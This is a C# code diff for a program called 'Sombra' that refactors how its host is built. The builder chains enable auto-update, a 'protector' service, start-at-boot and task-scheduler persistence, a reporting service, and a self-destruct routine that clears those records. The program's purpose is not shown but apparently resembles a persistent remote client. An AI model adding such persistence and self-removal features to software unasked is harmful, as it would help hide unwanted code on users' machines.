@@ -25,7 +25,7 @@ namespace Sombra
                     case "v":
                         break;
                     case "h":
-                        var host = new HostService().UseStartUp<StartUp>();
+                        var host = new HostBuilder().UseStartUp(null);
                         host.Run();
                         Logger.Print("\n\n-v -version\t\tView current version number.");
                         Logger.Print("-h -help\t\tView help.");
@@ -46,16 +46,17 @@ namespace Sombra
 
         public static void Run()
         {
-            var reactor = new ReactorService();
 #if DEBUG
-            var host = new HostService()
+            var server = new SombraServer();
+
+            var host = new HostBuilder()
                 .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: true, ForceCurrent: true)
                 .UseProtectorService(Disable: true, Debug: true)
                 .UseStartWithBootService(Set: false)
                 .UseTaskSchedulerService(Disabled: true)
                 .UseReportService(TimeOut: 1000, Delay: true)
-                .UseStartUp<StartUp>()
-                .UseReactor(reactor);
+                .UseServer(server)
+                .UseStartUp(server);
 #else
             var host = new HostService()
                 .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: false, ForceCurrent: false)
@@ -70,10 +71,10 @@ namespace Sombra
 
         public static void SelfDestory()
         {
-            var Destoryer = new HostService()
+            var Destoryer = new HostBuilder()
                 .UseTaskSchedulerService(Disabled: true)
                 .UseStartWithBootService(Set: false)
-                .UseStartUp<StartUp>();
+                .UseStartUp(null);
 
             Destoryer.Run();
             Logger.PrintSuccess("Removed all records. Please restart your computer and delete all files by yourself!");
